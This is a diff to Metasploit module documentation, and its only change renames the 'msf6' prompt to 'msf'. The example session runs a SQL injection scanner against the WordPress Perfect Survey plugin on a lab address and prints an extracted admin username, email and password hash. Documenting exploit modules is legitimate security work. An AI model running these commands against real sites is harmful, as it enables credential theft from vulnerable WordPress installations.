@@ -28,15 +28,15 @@ The specific vulnerable version can be found here: https://www.exploit-db.com/ap
 #### Example
 
 ```sh
-msf6 > use auxiliary/scanner/http/wp_perfect_survey_sqli
+msf > use auxiliary/scanner/http/wp_perfect_survey_sqli
 [*] Using auxiliary/scanner/http/wp_perfect_survey_sqli
-msf6 auxiliary(scanner/http/wp_perfect_survey_sqli) > set RHOSTS 192.168.1.104
+msf auxiliary(scanner/http/wp_perfect_survey_sqli) > set RHOSTS 192.168.1.104
 RHOSTS => 192.168.1.104
-msf6 auxiliary(scanner/http/wp_perfect_survey_sqli) > set RPORT 8000
+msf auxiliary(scanner/http/wp_perfect_survey_sqli) > set RPORT 8000
 RPORT => 8000
-msf6 auxiliary(scanner/http/wp_perfect_survey_sqli) > set TARGETURI /wordpress
+msf auxiliary(scanner/http/wp_perfect_survey_sqli) > set TARGETURI /wordpress
 TARGETURI => /wordpress
-msf6 auxiliary(scanner/http/wp_perfect_survey_sqli) > exploit 
+msf auxiliary(scanner/http/wp_perfect_survey_sqli) > exploit 
 [*] Running module against 192.168.1.104
 
 [*] Running automatic check ("set AutoCheck false" to disable)
@@ -50,5 +50,5 @@ WordPress User Credentials
  Username  Email                Hash
  --------  -----                ----
  admin     admin@localhost.com  $P$BwkQxR6HIt64UjYRG4D5GRKYdk.qcR1
-msf6 auxiliary(scanner/http/wp_perfect_survey_sqli) >
+msf auxiliary(scanner/http/wp_perfect_survey_sqli) >
 ```
